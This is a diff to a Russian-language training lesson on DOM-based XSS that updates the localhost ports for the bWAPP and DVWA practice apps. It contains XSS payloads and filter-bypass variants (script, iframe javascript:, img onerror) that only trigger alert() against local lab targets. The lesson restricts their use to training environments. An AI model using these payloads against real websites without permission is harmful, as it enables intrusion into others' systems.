@@ -23,7 +23,7 @@
 **Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.
 
 
-**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.
+**Процессный артефакт:** встроенный шаблон threat model или finding из пользовательской инструкции: abuse case, evidence и expected control.
 
 **Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.
 
@@ -179,7 +179,7 @@ Kali ARM64 VM используется как углубление, когда �
 
 ### Настройка bWAPP
 
-1. Откройте http://127.0.0.1:8080 (bWAPP)
+1. Откройте http://127.0.0.1:8082 (bWAPP)
 2. Войдите: bee / bug
 3. В выпадающем списке выберите **XSS - DOM (Resource interpretation)**
 4. Установите уровень **low** и нажмите **Hack**
@@ -188,18 +188,18 @@ Kali ARM64 VM используется как углубление, когда �
 
 **Шаг 1: Базовый пейлоад через URL**
 ```
-URL: http://127.0.0.1:8080/xss_dom.php?default=<script>alert(1)</script>
+URL: http://127.0.0.1:8082/xss_dom.php?default=<script>alert(1)</script>
 ```
 Результат: всплывает alert(1).
 
 **Шаг 2: Использование iframe**
 ```
-URL: http://127.0.0.1:8080/xss_dom.php?default=<iframe src="javascript:alert(2)"></iframe>
+URL: http://127.0.0.1:8082/xss_dom.php?default=<iframe src="javascript:alert(2)"></iframe>
 ```
 
 **Шаг 3: Использование img (если script заблокирован)**
 ```
-URL: http://127.0.0.1:8080/xss_dom.php?default=<img src=x onerror=alert(3)>
+URL: http://127.0.0.1:8082/xss_dom.php?default=<img src=x onerror=alert(3)>
 ```
 
 **Шаг 4: Анализ исходного кода**
@@ -214,7 +214,7 @@ document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
 **Шаг 5: Обход фильтра через события**
 Если `<script>` отфильтрован:
 ```
-URL: http://127.0.0.1:8080/xss_dom.php?default=#<img src=x onerror=alert('DOM XSS')>
+URL: http://127.0.0.1:8082/xss_dom.php?default=#<img src=x onerror=alert('DOM XSS')>
 ```
 
 ### Поиск DOM XSS с помощью DevTools
@@ -230,8 +230,8 @@ URL: http://127.0.0.1:8080/xss_dom.php?default=#<img src=x onerror=alert('DOM XS
 
 **Пейлоады:**
 ```
-URL: http://127.0.0.1:8080/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
-URL: http://127.0.0.1:8080/vulnerabilities/xss_d/?default=English<img src=x onerror=alert(1)>
+URL: http://127.0.0.1:8081/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
+URL: http://127.0.0.1:8081/vulnerabilities/xss_d/?default=English<img src=x onerror=alert(1)>
 ```
 
 Посмотрите исходный код страницы (Ctrl+U) — пейлоад НЕ будет в HTML. Он обрабатывается только JavaScript.
@@ -282,7 +282,7 @@ document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
 
 ```bash
 # Тестирование DOM XSS через curl (пейлоад не будет в ответе)
-curl -s "http://127.0.0.1:8080/xss_dom.php?default=<script>alert(1)</script>" | grep "script"
+curl -s "http://127.0.0.1:8082/xss_dom.php?default=<script>alert(1)</script>" | grep "script"
 # Ничего не найдет, так как это DOM XSS
 
 # Поиск уязвимостей в JS-файлах (на macOS)
